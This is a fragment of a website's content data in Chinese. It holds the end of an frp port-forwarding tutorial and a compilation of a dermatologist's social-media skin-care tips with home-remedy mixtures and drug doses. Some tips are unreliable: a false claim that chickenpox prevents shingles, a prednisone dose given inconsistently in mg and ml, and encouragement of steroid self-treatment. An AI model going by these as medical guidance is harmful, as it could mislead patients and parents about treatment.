--reload\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n而外部想访问服务器以及它的一些端口，那就必须放开一些端口，这个是在阿里云控制台——网络与安全——安全组。frpc所在机器想与云服务里的frps进行通信连接，需要开放云服务器安全组的7000给外部用；然后我们要使用rdclient进行远程桌面控制，通过frp将3389映射到云服务器的3360端口了，那么还需要开放云服务器安全组的3360给外部用。7000和3360开放给谁，也要限定好，不是谁想加就加的。\n\n\n\n安全组的授权对象我们使用的是前缀列表\n\n\n# 说在最后\n\n使用frp还是挺简单的，但是它的安全性还是有些差，功能上也只是反向代理、映射端口，如果想异地组网（虚拟局域网）那就不能使用frp了，可以使用softether实现虚拟局域网',charsets:{cjk:!0}},{title:"鹤叔医疗科普合集",frontmatter:{},regularPath:"/book-sketches/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB/%E9%B9%A4%E5%8F%94%E5%8C%BB%E7%96%97%E7%A7%91%E6%99%AE%E5%90%88%E9%9B%86.html",relativePath:"book-sketches/日常生活/鹤叔医疗科普合集.md",key:"v-f9cc7df6",path:"/book-sketches/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB/%E9%B9%A4%E5%8F%94%E5%8C%BB%E7%96%97%E7%A7%91%E6%99%AE%E5%90%88%E9%9B%86.html",headers:[{level:2,title:"写在前面",slug:"写在前面",normalizedTitle:"写在前面",charIndex:125},{level:2,title:"第一篇：抖音短视频科普集锦(20200221)",slug:"第一篇-抖音短视频科普集锦-20200221",normalizedTitle:"第一篇：抖音短视频科普集锦(20200221)",charIndex:440},{level:2,title:"第二篇 直播科普汇总",slug:"第二篇-直播科普汇总",normalizedTitle:"第二篇 直播科普汇总",charIndex:9726},{level:3,title:"细菌类",slug:"细菌类",normalizedTitle:"细菌类",charIndex:9741},{level:3,title:"病毒类",slug:"病毒类",normalizedTitle:"病毒类",charIndex:11003},{level:3,title:"真菌类",slug:"真菌类",normalizedTitle:"真菌类",charIndex:13334},{level:3,title:"损伤类",slug:"损伤类",normalizedTitle:"损伤类",charIndex:13915},{level:3,title:"毛孔、汗腺",slug:"毛孔、汗腺",normalizedTitle:"毛孔、汗腺",charIndex:15329},{level:3,title:"其他",slug:"其他",normalizedTitle:"其他",charIndex:70},{level:2,title:"注解",slug:"注解",normalizedTitle:"注解",charIndex:18377}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"写在前面 第一篇：抖音短视频科普集锦(20200221) 第二篇 直播科普汇总 细菌类 病毒类 真菌类 损伤类 毛孔、汗腺 其他 注解",content:"# 鹤叔医疗科普合集\n\n> 博主有话说：本人于2020年7月27日将《鹤叔医疗科普合集》搬到自己博客上了。以下内容只加了适当标题编号，没有对其他内容进行修改，是医学科普，仅供参考！科普作者可以搜微信公众号“仙鹤大叔张文鹤”，抖音是仙鹤大叔。\n\n\n# 写在前面\n\n（20200221）灯火阑珊 整\n\n整理者按：2019年10月份，一个偶然的机会通过抖音关注了鹤叔，他教我们通过最简单的方式，使用最便宜、易得的药物来解决常见的皮肤问题。不仅告诉我们治疗的方法，还解析了疾病的发病原理，使我们解除了痛苦，甚至治愈了很多久拖不愈的疑难杂症。鹤叔说他做科普一不为名，二不图利，就是希望老百姓多些知识的储备，少些后悔。通过鹤叔的科普，越来越多的人自己在家就解决了原本四处求医都不见好转的皮肤问题。\n\n杏林春满，医者仁心。鹤叔的科普如星星之火，以燎原之势在造福更多的百姓。希望我的整理稿，如一阵清风，带着这星火传递给更多有缘人。\n\n感恩鹤叔的无私科普，感谢鹤粉-壮壮的校对和查漏补缺！\n\n\n# 第一篇：抖音短视频科普集锦(20200221)\n\n 1.  鹤叔讲课一不为名，二不图利，希望老百姓少后悔：80多岁老人得带状疱疹听人说激素有危害，不用，过了治疗期疼得拿头撞墙，生不如死；十几岁的小孩激光治了跖疣不懂预防感染，差点截肢；漂亮女孩乱用化妆品，过敏后乱抹激素闹成激素依赖性皮炎。这类事触目惊心，就因为老百姓脑子里头没有这些知识储备。\n\n 2.  面部湿疹：夏天抱孩子不得当，宝宝的口水和大人的汗水混合会对宝宝的细嫩皮肤造成伤害，大人皮肤上的细菌也趁机入侵孩子的面部，接触部位不通风，刺激和细菌很容易造成面部湿疹。解决方法：在大人的肩膀放一块干净的手巾，孩子的脸贴在手巾上，既通风又吸收汗液和口水，避免细菌入侵。\n\n 3.  小儿湿疹：具备三只眼，第一只眼准确看清小孩体内毒素的眼，为什么皮肤不停出皮疹，本质是体内的毒素，其实就是一种神经介质，如果你不知道它的量就不知道用药到什么程度可以把它中和掉，不去根，所以病就要反复发；第二只眼看清皮疹的深度，深的用药强一些，浅的用药浅一些，因为外用药有副作用；第三只眼看清孩子生活中的哪些危险因素，及时避开，及时用药。这三只眼教不了你，只能来找医生看。\n\n 4.  小儿肛周湿疹：标准黄连素水加10毫升乐肤液，中午或晚上睡觉的时候用小手巾蘸着混合液夹在孩子的屁屁里，保持半个小时，早上和下午再用混合液各抹一次，95%以上的孩子有三五天就可以彻底消退了。\n\n 5.  外耳道湿疹：小孩乱掏耳朵眼，掏得流脓淌水，痛痒不止怎么办？一支开塞露、一支乐肤液、再加两毫升碘伏混合，用棉签蘸着一天给他抹三回，在耳道内转一圈，三五天之内搞定。\n\n 6.  干燥型湿疹：一脱裤子抓小腿，一抓小腿掉白沫，抓久了皮肤增厚出白斑是典型的症状，用凡士林。\n\n 7.  幼儿的急性湿疹：有很强的规律性，夏初多数跟皮温过高有关，皮温高，出的汗多排不出来留在里边形成痱子，刺激周围产生急性湿疹；夏中和紫外线照射有关，孩子皮肤不耐受，出现急性湿疹；到夏末，跟饮食有关，经过夏天孩子脾胃功能弱，很多东西没有消化，进入体内，引起急性湿疹反应；入秋开春和皮肤干燥有关，因为气候干燥细胞间缺少粘合性，外界一刺激，形成肉眼看不见的裂口，外来物进去，引起湿疹反应。\n\n 8.  干性湿疹：特别是腿上，什么都没长，但干的掉沫，是典型的干性湿疹，抹润肤露就能解决。小孩干燥性湿疹病例：治疗效果不好，是由于大人搂着孩子睡，温度高，烤的干燥。建议让孩子在小床上单独睡，温度不要太高。\n\n 9.  被蜂蜇了：黄蜂蜇了抹醋因为它的毒液的碱性的，蜜蜂蜇了抹肥皂水。（蜜蜂与黄蜂的区别：蜜蜂只有黄蜂肚子那么大）\n\n 10. 水痘：冬天和春天多见。米粒儿到豌豆大小鼓鼓溜溜的小水泡，水疱周围一圈红晕，如果水疱中间出现一个像肚脐似的小窝，这个病基本就确诊了，得病前一般发烧，有的不烧，发病部位先从头顶脸上开始之后向躯干和四肢蔓延，这个病是自限性的，三到四周就好了，针对性的可以用板兰根抗病毒，抹一点紫药水防止感染，挠的厉害可以用点止痒药口服，小时候得水痘，长大就不得带状疱疹。\n\n 11. 水痘留疤问题：两种情况会留疤，一是感染，抹上龙胆紫溶液，收敛了就不感染了；二是抓破，一天三回吃上止痒药（如扑尔敏），不痒就不抓了。\n\n 12. 带状疱疹：第一，为什么强的松片能预防愈后神经痛？它相当于洗衣服时放的柔顺剂，柔顺剂使衣服缩水不那么厉害，强的松的作用是让神经鞘恢复时，箍着神经不那么紧，自然就不会神经疼了；第二，激素能不能用？激素是药不是毒药，在医生指导下合理用量，快上快下就是安全的；第三，糖尿病和高血压怎么办？在专科医生指导下使用这个方法；第四，每天吃15毫克多不多？不多，书上写的是40-60毫克，但是临床发现15毫克就够了；第五，发病超过两周之后这个方法还管不管用？没用了。强的松的吃法是每次15毫升，连吃7天。\n\n 13. 毛囊炎、疖肿、汗腺炎、甲沟炎:一瓶碘伏搞定。\n\n 14. 斑痕疙瘩：肤疾宁贴膏（曲安奈德新霉素贴膏），对将近一半斑痕疙瘩管用，把贴膏剪开比疙瘩大一点贴上，24小时换一次，如果一个月之内变软，没有疼痒或长新疙瘩，多数在两一个月变好，连用三个月可以彻底搞定。这个治疗法和斑痕疙瘩的时间长短没关系，只看你的体质接受不接受。\n\n 15. 荨麻疹：种类很多，一半以上和饮食有关。病例：发的时间都在晚上，晚上不容易接触花粉，也不容易接触尘螨，为什么在这时候过敏呢，分析可能是和吃有关，晚上尽量少吃，而且不要碰大鱼大肉，这样坚持三天，三天后就没有再发了，分析其根本原因是脾胃功能弱，晚上不消化。\n     \n     * 干燥型荨麻疹：晚上进被窝就痒，一挠起大疙瘩，半小时内消退掉，是典型的干燥型荨麻疹，用润肤露给它盖上就不发病了不用吃药。\n     * 假性荨麻疹：不是因为对食物过敏，而是短时间吃肉太多，孩子脾胃功能弱，没有把蛋白质完全吸收，所以有一部分入血，所以过节给孩子吃肉少一点慢一点。\n\n 16. 扁平疣：一是用碘伏，一天五次，连抹一个月，3分之一就下去了；二是抹了150次才把它治下去值不值？用激光很快，一次会彻底干净，但又疼又留疤，怎么选择自己看；三是为什么只有三分之一？因为这是临床数据，去医院之前有三分之一概率能治好，要不要选择自已决定；第四，成人用药之前要把扁平疣泡软磨薄会不会造成新的传染？把碘伏抹的范围扩大新病毒就杀死了；第五，脸上、眼皮上的能不能用，只要不抹到眼睛里都可以；第六，碘伏抹完会不会色素沉着：放心，不会。扁平疣主要就是HPV病毒3、8、10型引起的，对碘剂敏感。大人表皮比较厚需要泡软磨薄后抹。\n\n 17. 汗管瘤：预防只有半个办法：中药里面有凉血功效的方子，似乎管用。治疗有一个半办法：一个办法是用激光或电解这种热疗把它做掉，半个办法是：有报道称，一些抗病毒的药水或药膏似乎管用，可以试一下。\n\n 18. 脸上的汗管瘤和扁平疣有三点不同：第一扁平疣是病毒感染，汗管瘤是良性皮肤肿瘤；第二扁平疣表面发乌，汗管瘤表面有蜡样光泽；第三扁平疣鹤叔有绝招，汗管瘤没有。\n\n 19. 脚气、股癣、体癣、汗斑：为什么顽固，就像除草剂用久了，草会产生搞药性就不管用了，所以一定要把不同的脚气膏轮换着用，记住口决：“坐等还书”。“坐（唑）”是一大类，所以叫“唑等“，如达克宁、孚琪、克霉唑，化学名里都有个“唑”，“还”是环利软膏，它是合成药类（环丙酮胺），“舒”是指丙烯胺类的药物，特比萘芬，别管叫兰美抒、疗霉舒，后面一定有个舒（抒）字，这几种药每个用两三周，轮着换，可以把一些产生耐药性的真菌都杀死。\n\n 20. 寻常疣和丝状疣：寻常疣是刺猴，长在脚底板叫跖疣，长在指甲旁连叫甲旁疣，这两种疣不好治。长在脖子上一般容易长成丝状疣或指状疣，治起来比较简单，把它用电刀、激光烧掉，根部小，基本不留疤，它跟皮赘分不清做掉都是没错的。\n\n 21. 跖疣和鸡眼怎么区分：把表皮削掉，如果有密集的小点就是跖疣。\n\n 22. 倒刺：就是干出来的，把它剪掉，用五块钱的护手霜抹上就可以了，别撕。\n\n 23. 玫瑰糠疹：第一，和病毒感染有关可以口服板蓝根；第二，外用一些炉甘石洗剂6-8周自己能好；第三，不会留疤。\n\n 24. 孩子晒伤：半小时内做三件事，一是用手头一切凉的东西给皮肤降温；二是标准黄连素水冷湿敷；三是用去炎松或艾洛松薄薄抹一层。一多半可以不发日光疹。\n\n 25. 牛皮癣：到正规医院治疗，否则很危险，牛皮癣治疗有成熟的治疗方案，不能根治，是基因病，发病程度因人而宜，有百分之六十以上都不严重，不要自己瞎抹药，容易成严重的。\n\n 26. 小孩烂嘴角：开塞露和乐肤液1：1混合一天抹三回，一周好。开塞露是苦的，防止小孩舔，乐肤液起作用把它治好。\n\n 27. 口周皮炎：开塞露和乐肤液1：1混合，一天抹三回，这两个组合很合理，既能保湿又可以滋养还能够封包增强药效，便宜可靠有效。口服药可以用老药扑尔敏，一天三回。只针对较轻的比较管用。\n\n 28. 小孩盗汗：前半夜出汗，就像商店关门后店员盘点，累的出汗，是正常的，如果后半夜出汗，有可能是盗汗需要看一下。\n\n 29. 关于药物的副作用：就像毒虫，用好了可以以毒攻毒来治病，西药又何尝不是呢。\n\n 30. 痱子相关\n     \n     * 秋冬季节，孩子在运动或出汗的时候，后背出现某些针扎样的痛痒。皮肤正常，有鸡皮样的小疙瘩，99%是痱子。\n     * 痱子或痱子引起的湿疹：多是暖气房捂出来的，专家门诊一半以上是痱子或痱子引起的湿疹。标准黄连素水试用两天，实在不行再往医院抱。\n     * 家长质疑家里温度不高孩子怎么会得痱子：问你抱不抱孩子，答孩子总得抱，不然就闹。人体半小时产生的热量可以使半加仑水，也就是1.9升水沸腾，你想抱孩子时间长，孩子的皮温要上升多少？要控制的不是室温、气温，而是孩子的皮温。\n\n 31. 股癣：如果孩子的大腿根部最早是个红点，后来变成红斑，最后再扩大成地图样，边上高中间低，那基本上就是股癣了，治疗方法：一是勤换内裤，开水烫洗内衣；二是脚气和股癣同时治疗；三是“坐等还书”选三种药轮换使用。\n\n 32. 吃什么提高孩子皮肤免疫力：见风见雨见太阳，在自然界多锻炼，只要孩子能承受，不管对感染类还是过敏类疾病都有预防作用。\n\n 33. 碘伏会色素沉着吗：碘伏只进表皮不进真皮不会色素沉着。\n\n 34. 手足口病：家长一怕误诊，二怕后遗症，记住口决：除长在手足口部位之外，还有十个字：“个大”：一般的病毒疹是芝麻和针尖大，它是黄豆豌豆大；“数少”：别的一长一堆，它全身可能就50个；“抗病毒”：治疗起来用点板蓝根就可以把它治下去；“一周好”：7-10天自己就可以消退不留什么痕迹也不复发。\n\n 35. 碘伏注意事项：一是过敏性的疾病不能用碘伏；第二不能当面膜来敷；三是碘伏不能喝。\n\n 36. 假期出门必备：碘伏，受伤了预防感染，不受伤治疗皮肤的细菌病毒感染；黄连素，拉肚子内服，晒伤、烫伤、痱子泡水外用；再带上开塞露肠干内用，皮肤干外用。\n\n 37. 肛周脓肿：500毫升标准黄连素水加50毫升碘伏，一天湿敷3-5次，每次半小时，坚持两周，三分之二不需要手术。\n\n 38. 汗疱疹：是长在手指侧面手侧面或脚趾旁密集的小水泡，非常痒，破了之后爆点皮，这个病的发病原因各有说法，有说病毒感染、有说过敏、有说排汗不畅，不要问鹤叔怎么根治，但是发病之后可以用乐肤液原液一天抹三次，一般一天就可以变干。\n\n 39. 灰指甲（甲癣）：氯霉素眼药水和碘伏2：1混合一天抹五次，三分之一概率有效。\n     \n     * 甲癣分两种：浅表型和甲下型，浅表型长在甲板表面，最早小白点，后来浑浊，再后来变形；甲下型长在甲板和甲床之间，这种到医院刮掉表面的甲屑，里面未必有真菌，不但检测不出还难治疗，因为在甲下，药进不来。\n     * 治疗有三种方式。第一种：拔甲。拔掉了直接上药；第二种：用口服药。抗真菌药保证新长出来的指甲是干净的，把老的顶掉；第三种：氯霉素眼药水和碘伏2：1混合抹上去，它可以往里面渗透，如果甲板太厚，可以用指甲搓搓薄一点再上药，一天5次，可能一个月见效。这样可以避免拔甲的痛苦和吃药的损伤，最后一种方法用一两个月还不行，快点换一、二种方法。\n\n 40. 用碘伏会发生红肿过敏的原因：分析是剂型原因，安全起见用1%的医用碘伏。\n\n 41. 病例：母子两个，洗完澡小腿就痒，一抓起红疙瘩，一个多月没采取任何措施，痒了抓，从小腿到大腿到全身慢性湿疹，这是十几块钱就能预防的，小腿皮脂腺少，洗完澡后小腿最先开始干，出现微小裂口，这时候用润肤露就能解决预防。\n\n 42. 润肤霜：分两种，水包油，清爽，油包水，保湿性好。皮肤干用用油包水的，如凡士林。\n\n 43. 足底皲裂：不是湿疹、脚气，是刮死皮刮出来的，越刮越厚越裂，只要不烫、不刮、不磨，早晚抹尿素霜，一般一两个月痊愈。\n\n 44. 肚脐发炎：氯霉素眼药水滴上，一天滴5次，两天就好了。\n\n 45. 婴儿痤疮：随着孩子激素逐渐稳定可以自然消退，书上说不需要治疗，但看着难受，容易湿疹化，可以用氯霉素眼药水和碘伏2：1混合一天五次，不是满脸抹，两天能消掉。\n\n 46. 小孩脖子淹了和红屁股：标准黄连素水湿敷，一天5次，严重的加10毫升乐肤液，最多一周下去。\n\n 47. 幼儿急疹：高烧39、40度，但是孩子没有萎靡不振，烧三四天烧退出疹，先躯干，后四肢，淡红色斑片，这是标准的幼儿急疹三四天自己就能好，不要慌。（注：没有说不让吃退烧药）\n\n 48. 婴儿头上发了脂溢性皮炎之后，会产生一层黄色的油痂，有的宝妈问要不要把它洗掉？这种皮炎发作需要三个环节，第一，油脂过度分泌，第二，油引起了细菌的大量繁殖，第三，细菌和它的排泄物刺激皮肤引起皮炎，所以在一斤水里放上三种常用药，分别针对这三个环节；5片黄连素减少油脂的分泌；10毫升碘伏可以有效杀菌，再放5毫升乐肤液消掉皮炎。用这个混合液一天抹5次，有4-5天就会消掉了，洗痂会刺激它，会加重的。\n\n 49. 晚上剧咳：有些肺火盛的孩子各项检查指标都正常，就是入夜剧咳，偶尔咳出小硬快，这一般是痰液被烤干了，刺激气管造成的，吃“桃金娘油”或“桉柠蒎”或者雾化，给痰软化排出来自然就不咳了。\n\n 50. 孩子前胸后背毛囊炎就三招：一是外用碘伏，二是睡前吃扑尔敏止痒，三是烫洗枕巾、背套、床单每周一次。\n\n 51. 鸡皮肤怎么治：不可能根治，青春期特别重时尿素霜有缓解。\n\n 52. 用黄连素水敷屁股后冬天会干：要懂变通，及时抹润肤霜。\n\n 53. 神经性皮炎：一半以上的精神压力来自于家长的清华北大梦，用点多虑平抗焦虑再抹点皮炎平可能就下去了，但压力一来又犯了，家长佛系一些。\n\n 54. 小儿唇炎：冬天常见小儿口唇炎用开塞露和乐肤液1：1。成人也可以用。\n\n 55. 头皮屑：洗发水加碘伏。能不能去根？因为是外界的复杂环境导致，谈不上去根儿。碘伏毕竟是化工用品，建议跟纯中药的洁尔阴换着用。碘离子和洁尔阴有杀菌和收敛的双重作用，所以这个方法说得通。（留言回复中说：先挤洗发水，再加两毫升碘伏）\n     \n     * 用碘伏治头皮屑后头皮红肿：分析可能用的是3%高浓度的，浇的也多，建议浓度低点多洗几次不影响效果。\n\n 56. 青春痘相关\n     \n     * 青春痘和粉刺的关系：如果青春痘是王者荣耀的话，粉刺是青铜、丘疹是白银、脓疱是黄金、结节是铂金、囊肿是钻石、瘢痕是星耀，聚合性痤疮是王者。\n     * 青春痘什么时候用碘伏，什么时候用十滴水：红头脓头用碘伏，白头黑头十滴水。\n     * 青春痘的痘痕：分轻重两种，重型的比如囊肿型、脓肿型痤疮一定留疤，神仙来也没用所有治疗方法只能淡化，而普通型（轻型）呢有两到三个月这个痕迹就能消退掉，别去乱花钱。\n     * 十滴水用法：一天至少三次洗脸，用稍烫手的一盆热水加半支十滴水洗脸用，再用中性洗面奶揉搓至少1分钟，最后用干手巾擦干，抹婴儿润肤露，减少化妆，不用粉底。\n     * 前胸后背、下巴脖子上的痘：是最简单的毛囊内的细菌感染。抹碘伏，为了防止睡后痒的时候无意识的抓，引起细菌种植，可以吃一片扑尔敏止痒；床单被套枕巾开水烫洗，每周一次。\n     * 各区青春痘：额区、鼻区、口周区、颊区。发病机理不同。鼻区最简单：一般是螨虫引起的，硫软膏加碘伏，硫软膏在外面杀，碘伏追进去杀。第二好治的颊区，细菌感染导致，手摸，抓痒也会让细菌种植，用碘伏绝杀，烫洗床品防止种植。前胸后背等同于面颊部的发病原理。第三是口周的痤疮，一般跟肠道内毒素太高有关所以在用十滴水和碘伏的同时忌吃辣椒，注意不要便秘，每天至少排便一次。第四是额区的，是由于雄性激素水平升高导致的，青少年多运动把雄性激素消耗掉。\n\n 57. 十滴水相关\n     \n     * 十滴水去粉刺什么时候可以停：皮肤上的油是血糖转化过来的，十滴水给你去掉了粉剌，那头吃的甜食多了产生的油脂比去掉的还多，怎么能停呢。\n     * 十滴水洗脸的问题：有四分之一的人会出现闭口粉刺突然红了，原因是毛囊打开了，细菌开始生长，处理很简单，用碘伏杀菌，等粉刺全部排出自然就好了。\n     * 用十滴水注意：用十滴水洗完后不要用粉底，用润肤霜。表皮干燥会使角质层增厚会堵塞毛孔的。注意皮肤损伤不能用。\n     * 十滴水洗黑头病例：洗一次就没黑头了，鹤叔提醒，黑头很长和毛囊深度一样长，表面的洗掉了，里面还多呢！接着洗。排出过程中如果口小，粉刺硬就会顶牛变红疙瘩，抹碘伏一段时间就好了。\n\n 58. 顽固粉刺三大主要原因 用十滴水洗脸去粉刺效果不理想的三大原因：第一，没有忌口，爱吃辣，肠道不停产生毒素，刺激粉刺；第二，洗完脸之后脸不抹润肤，表皮增厚，产生粉刺；第三，爱发脾气雄激素刺激额部，产生粉刺。\n\n 59. 脚臭：用碘伏把表面的菌杀掉，用甲硝唑把厌氧菌杀掉，就不臭了。每天晚上在洗脚水里加上10毫升碘伏，把脚和袜子浸泡5分钟以上，把甲硝唑片磨成粉在鞋垫上洒一遍，三分之二概率有效。足光粉像是把整个城市道路和汽车全都毁了治理尾气（破坏汗腺），鹤叔的方法相当于单双号限行（杀菌）。\n\n 60. 点评碘伏杀不死螨虫的视频：很正常，螨虫分40多种，人体就10多种有一碰碘伏就死的蠕形螨，有毒药杀不死的疥螨。就像猫科的猫和老虎，差距很大。\n\n 61. 冻疮：当归四逆汤（药房可配）起到一个活血温阳益气作用，加西药赛庚啶，可缩短病程，比激素还好用。\n\n 62. 脚汗：这是一个排水系统，不能把它堵上，这和交感神经兴奋有关，别为小毛病把整个神经系统给扰乱了。\n\n 63. 小孩肛周毛病：在家常备标准黄连素水，痱子的话一天抹5次3-4天下去，如果是肠液引起的肛周湿疹，标准黄连素水加10毫升乐肤液，两三天下去，肛周毛囊炎，在标准黄连素水中加20毫升碘伏，不用去医院。\n\n 64. 表皮受损的表现：摸着热、粗糙，红血丝。\n\n 65. 草莓鼻：热水加十滴水洗、泡、搓掉。\n\n 66. 表皮损伤不能用的：十滴水、碘伏，用了会疼，还有激素药膏和抹酸都不能用。\n\n 67. 红血丝、表皮损伤：标准黄连素水一天三次湿敷，不化妆，只用婴儿润肤霜。只是难在三个月不化妆。有的超级敏感肌，用黄连素水会红肿，那是由于表皮受损过于严重，对黄连素水不耐受，可以先用清水湿敷1-2周再用黄连素水。三个月后消红消肿了，就不用湿敷了，只需要每天保持三次用婴儿润肤露抹脸，再保持三个月。修复大红脸没有捷径，有人问已经见效了能不能化妆，鹤叔答，你想多了，两个阶段一个阶段三个月，皮肤结构决定了，少一个月都不行，\n\n 68. 缩小毛孔：用十滴水把毛孔里面的东西排出来，慢慢它就闭上了。\n\n 69. 前胸后背毛囊炎：在用碘伏杀菌的同时，每周把床单、枕巾、被套、内衣用开水烫洗一次。防止这些东西往你身上种植细菌。\n\n 70. 股癣：大腿根黄豆大小的小疙瘩，后来变成一串，一般是股癣，是脚气传染的。脚气药膏和皮炎平1：1混合治疗效果更好。\n\n 71. 过年小小孩易得的问题：感冒，穿衣服不及时；痱子，脱衣服不及时。用标准黄连素水，一天5次，在家就治好了。\n\n 72. 风寒性感冒：主要症状是怕冷、怕风，“一清二白”。“一清“是流清鼻涕；“二白”是白痰、白舌苔。治疗方法：姜糖水、葱白水都管用，多数不用往医院跑，更多方法可百度。\n\n 73. 皮肤的浅层细菌感染：包括毛囊炎、疖肿、蜂窝组织炎、青春痘，只要没有过敏，用碘伏既经济又实惠，感染比较深、有发烧必须去医院。\n\n 74. 口罩病：戴口罩久了一是内表面刺激引起的接触性皮炎？二是不透气导致的和痱子类似的损害。两种病早期都可以标准黄连素水湿敷来治疗。\n\n 75. 脸上表皮损伤怕刺激，可不可以不洗脸：不洗脸油脂会被细菌分解，变成乳酸刺激你的皮肤，表皮损伤没治好，脂溢性皮炎又来了。\n\n 76. 一线医护人员长时间戴手套，在乳胶滑石粉和高温联合作用下，特别容易出皮炎：如果用激素药膏，又高温又潮湿又容易继发细菌感染，这时可以用标准黄连素水，轻的抹，重的敷，简单、安全、有效。\n\n 77. 颈椎问题：颈椎1、2椎间隙受到压迫表现为头疼、头晕、失眠，眼睛不舒服；3、4椎间隙受到压迫表现为胸闷、脖子疼、枕部麻木、鼻子堵、还有咽喉里的异物感；颈椎的下段5、6或6、7椎间隙受损表现为：心慌、心律不齐、肩疼、胳膊疼、手指头麻。适当把手机放一放，活动活动，和家人聊聊天、走一走，症状就消失了。\n\n 78. 紫外线灯烧伤：先冰敷降湿，再抹上京万红。（来自鹤叔在抖音的留言回复）\n\n 79. 勤洗手的三个常见病：新冠防疫期间频繁洗手，会出现三个病。第一，手背皲裂，要每次洗手后抹护手霜；第二，指甲后连长倒刺，这叫逆剥，只能剪，不能撕；第三，手指侧面密密麻麻很痒的小水泡，是汗疱疹的话，抹乐肤液（哈西奈德溶液）\n\n 80. 在护目镜上擦碘伏，烧伤皮肤的原因和解决办法：当带上护具的时候，护具里面的皮肤表面有一个最大的变化，就是水气出不去，非常潮湿，我们表皮上最上层的角质层在这么潮湿的环境下会变厚变脆，摩擦之下会出现很多微小的裂口，碘伏也好，含氯消毒液也好，酒精也好，这些化学成份，顺着这个小裂口就长驱直入，深入表皮，甚至深入真皮，产生一系列的损害，这就跟表皮损伤，激素脸的姑娘们一样，连普通的洗面奶都用不了。赶快用标准黄连素水湿敷修复角质层。\n\n 81. 戴口罩、讲卫生的好处：出门戴口罩，回来就洗手、洗脸、洗鼻子，可以预防花粉、柳絮引起的过敏性鼻炎、哮喘、皮炎，比吃药效果还好。\n\n 82. 嘴角撕皮，为什么不建议撕皮？该如何治疗？如果你有这个毛病，你不戒它，光靠鹤叔说的抹1：1混合液是不够的。因为表皮越撕，越会拼命生长，最后嘴唇又红又肿，还爆皮。在管住手不撕皮的情况下，抹开塞露和乐肤液1：1混合液抹上。过两周恢复之后就别抹这个混合液，改用润唇膏。\n\n 83. 用含氯消毒液可以洗手吗？什么患者都不用含氯消毒液洗手，只有像操作过病人之后的医护人员，特殊情况才需要用含氯消毒液洗手，否则一般情况下不使用。用正常的洗手液、香皂、肥皂就可以，再不放心洗完后用酒精擦一遍就可以。比用什么东西洗手更重要的是怎么洗手。用六步洗手法，手背、手指缝、手指、手指尖、手腕都洗。相反，你用含氯洗手液特别容易过敏和烧伤皮肤。日常物品消毒用1000毫升水里放10毫升84消毒液就可以了。\n\n 84. 小儿痱子的原理和成因及解决办法：汗液可以滋润皮肤，同时还散热，你把宝宝给裹那么热，生怕宝宝冻着、捂着，宝宝出汗多，汗液出来后在表皮泡着，表皮会变厚，把汗腺口给堵上了。（待续）\n\n\n# 第二篇 直播科普汇总\n\n\n# 细菌类\n\n# 一、毛囊炎、肛周脓肿、肉芽肿\n\n中医讲体内湿气重易出现感染，表现为头上的毛囊炎，身上的疥肿、小孩的肛周脓肿，脸上的痤疮（痤疮也是毛囊炎），原因是体内的能量得不到宣泄，本质是皮肤内的感染。如果继续向下穿到真皮层、皮下组织，就形成脓肿。头皮毛囊变脓肿，头发就保不住了，并且不可再生；痤疮变脓肿就一定会留疤，所以感染类的疾病不要让他发展到重的程度。\n\n无论是头上、前胸后背、身上的、脸上的、小孩屁股上的，所有红的疙瘩，上面带白尖的，抹碘伏，一天三次，抹上就好，因为碘伏含碘剂，所有细菌都受不了，它直接破坏细菌的细胞壁。如果不管用，一定是碘伏有问题，要么是假的，要么是浓度不对，太低了，因为临床上没有一个浅表的细菌感染用碘伏无效的。\n\n肛周脓肿，有两大原因，一是毛囊炎发展而来，二是肛裂继发感染。两种原因抹碘伏同样有效。早期没有及时治疗，后来炎症突破表皮、真皮、皮下组织就形成了脓肿。治疗方法：肛周脓肿抹药膏其实效果不好，孩子屁股一夹起来就被挤跑了，推荐轻症的或小小孩用标准黄连素水+20毫升碘伏+10毫升乐肤液湿敷，在睡觉时，将浸湿到可以滴水但水不连成线的纱布夹在孩子的屁屁里，让纱布能接触到脓肿的位\n\n置，让纱布带走热量和水份，同时把炎症带走，起到收敛的作用，过几天会发现脓肿破了，脓被纱布带走，这就是所谓的拔毒，这时湿敷保持一天3-4次；4-6岁的孩子或严重的，直接用50毫升碘伏+5毫升乐肤液来敷，每次 10分钟-15分钟，2-3天，最多不超过5天，脓头会破开，纱布会把脓吸出来，只要把脓吸出来就好了，有一半孩子治的晚的，会出现囊壁，过段时间还会复发，只能先对抗着，一有反应就用碘伏，有的就封口了，形成一个硬疙瘩，这就没问题了；有的怎么也不封口的，孩子大点后可以去普外做个小手术，但绝大多数到不了那一步，需要手术的不超过1%。\n\n脓肿是囊肿向下发展而成，如果向上发展就会形成肉芽肿，治疗方法和脓肿一样。\n\n毛囊炎\n\n脓肿、肉芽肿\n\n形成囊壁反反复复的\n\n抹碘伏\n\n按轻重和孩子大小选择配比，纱布湿敷。\n\n湿敷对抗，能封口就好了，不封口的再手术\n\n# 二、干性湿疹\n\n典型的表现是，一脱衣服开始痒，过几个小时就不痒了，那是因为表皮干燥撑出小裂口，细菌入侵，产生组胺导致痒，同时细胞渗液，过几个小时，渗出液修复小裂口，阻止细菌的入侵，就不痒了。治疗方法就是像抹果酱一样用勺子抹凡士林，早晚各一次。\n\n角质层的保水率是99.9%，使下层的水出不来，同时外\n\n面的水也很难补进去，所以平时用的润肤水基本没什么用，只能起到软化角质的作用，角质层怕干，小腿前面和小臂都是最容易缺油的位置，易干燥，不注意润肤就会出现身体干的地方更干，油的地方更油。\n\n很多孩子的毛囊炎也是干性湿疹发展来的。\n\n# 三、成人脂溢性皮炎\n\n50毫升碘伏+5毫升乐肤液混合后涂抹，一天3次，4-5天，有效率80%。\n\n# 四、黄水疮\n\n是由葡萄球菌引起的，会结出黄色的痂。治疗方法是剃光头抹碘伏，一周时间就好，一样要烫洗衣被，每周一次。\n\n\n# 病毒类\n\n# 一、幼儿急疹\n\n两岁以内多发，前期症状是高烧，烧到39-40度，三天后烧降下来，头、脖子、身上、躯干起疹子，疹子3、4天就下去了，这种病其实只是看似凶险，家长不用慌乱，但如果病毒侵犯入脑了或出现了感染的话要快去医院。\n\n如何判断是否有侵犯入脑或感染：观察孩子吃完退烧药烧退了之后精神状态良好，跟没事儿人一样，那一般就没什么问题。如果孩子烧降不下来，或降下来之后精神萎靡，就需要快去医院。\n\n# 